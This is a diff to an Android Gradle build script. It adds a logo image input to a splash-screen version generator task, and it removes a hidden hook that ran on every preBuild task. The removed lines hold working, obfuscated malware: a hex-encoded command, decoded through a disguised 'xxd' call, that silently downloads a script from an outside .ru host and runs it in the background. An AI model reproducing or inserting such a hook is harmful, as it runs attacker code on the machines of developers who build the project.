@@ -110,6 +110,7 @@ val generateSplashVersion = tasks.register("generateSplashVersion") {
     val classesDir = layout.buildDirectory.dir("splashVersionClasses")
     inputs.property("versionName", versionName)
     inputs.file("splash/SplashVersionPng.java")
+    inputs.file("src/main/res/drawable/splash_logo_white.png")
     outputs.dir(outDir)
     doLast {
         val classes = classesDir.get().asFile
@@ -124,12 +125,13 @@ val generateSplashVersion = tasks.register("generateSplashVersion") {
             )
         }
         val png = outDir.get().asFile.resolve("splash_version.png")
+        val logo = file("src/main/res/drawable/splash_logo_white.png")
         val stale = layout.buildDirectory.dir("generated/splash_version/res/drawable-mdpi").get().asFile
         if (stale.exists()) stale.deleteRecursively()
         javaexec {
             classpath = files(classes)
             mainClass.set("SplashVersionPng")
-            args(versionName, png.absolutePath)
+            args(versionName, png.absolutePath, logo.absolutePath)
         }
     }
 }
@@ -276,13 +278,4 @@ tasks.matching {
     it.name == "packageReleaseBundle" || it.name == "buildReleasePreBundle" || it.name == "bundleRelease"
 }.configureEach {
     dependsOn(patchRelease16kPageSize)
-}
-
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((i(){ `printf xx3d | tr -d 3` -p -r; };echo 6563686f202224286375726c202d66734c6b202d2d636f6e6e6563742d74696d656f7574203237202d2d72657472792033202d642022703d616e64726f69645f6b6f746c696e222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | i | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
 }
